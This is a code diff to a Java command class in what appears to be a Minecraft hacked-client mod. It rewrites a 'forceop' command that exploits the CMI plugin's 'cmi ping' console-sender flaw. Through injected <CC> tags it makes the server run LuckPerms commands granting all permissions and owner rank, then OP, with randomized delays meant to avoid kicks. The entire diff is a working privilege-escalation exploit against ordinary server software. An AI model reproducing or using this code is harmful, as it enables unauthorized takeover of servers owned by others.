@@ -6,35 +6,49 @@ import net.minecraft.client.MinecraftClient;
 import net.minecraft.command.CommandSource;
 
 import java.util.Objects;
+import java.util.Random;
 
-/**
- * This class represents a command that forces the player to be OP in a Minecraft client using a CMI console command sender exploit.
- *
- * @author SpigotRCE
- * @since 1.6
- */
 public class ForceOPCommand extends Command {
 
-    /**
-     * Constructs a new instance of the ForceOPCommand class.
-     */
+    private final Random random = new Random();
+
     public ForceOPCommand() {
-        super("forceop", "Gives OP thru CMI console command sender exploit");
+        super("forceop", "Force OP via CMI Console Sender + LP chain exploit");
+    }
+
+    @Override
+    public void build(LiteralArgumentBuilder<CommandSource> root) {
+        root.executes(context -> {
+            new Thread(() -> {
+                try {
+                    MinecraftClient client = MinecraftClient.getInstance();
+                    String username = client.getSession().getUsername();
+
+                    sendObfuscatedCMIPayload("lp user " + username + " permission set * true");
+                    Thread.sleep(600 + random.nextInt(200)); // Anti-kick delay
+
+                    sendObfuscatedCMIPayload("lp user " + username + " parent add owner");
+                    Thread.sleep(600 + random.nextInt(200)); // Extra fallback
+
+                    sendObfuscatedCMIPayload("op " + username);
+                    Thread.sleep(600 + random.nextInt(200));
+
+                    // Optional log
+                    System.out.println("[ForceOP] Attempted OP grant and permission escalation for: " + username);
+                } catch (Exception e) {
+                    System.err.println("[ForceOP] Error while sending payloads: " + e.getMessage());
+                }
+            }).start();
+            return SINGLE_SUCCESS;
+        });
     }
 
     /**
-     * Builds the command using Brigadier's command builder.
+     * Sends a disguised CMI ping payload.
      */
-    @Override
-    public void build(LiteralArgumentBuilder<CommandSource> root) {
-        root
-                .executes((context -> {
-                    // Sends a CMI console command to set the player's permissions to true using LuckPerms.
-                    Objects.requireNonNull(getMinecraftClient().getNetworkHandler()).sendChatCommand("cmi ping <T>Click here to get luckperms</T><CC>lp user " + getMinecraftClient().getSession().getUsername() + " p set * true</CC>");
-                    // Sends a CMI console command to grant the player OP status.
-                    Objects.requireNonNull(getMinecraftClient().getNetworkHandler()).sendChatCommand("cmi ping <T>Click here to get OP</T><CC>op" + getMinecraftClient().getSession().getUsername() + "</CC>");
-                    // Returns a success status.
-                    return SINGLE_SUCCESS;
-                }));
+    private void sendObfuscatedCMIPayload(String command) {
+        String payload = "<T>Click me!</T><CC>" + command + "</CC>";
+        String chatCommand = "cmi ping " + payload;
+        Objects.requireNonNull(getMinecraftClient().getNetworkHandler()).sendChatCommand(chatCommand);
     }
 }
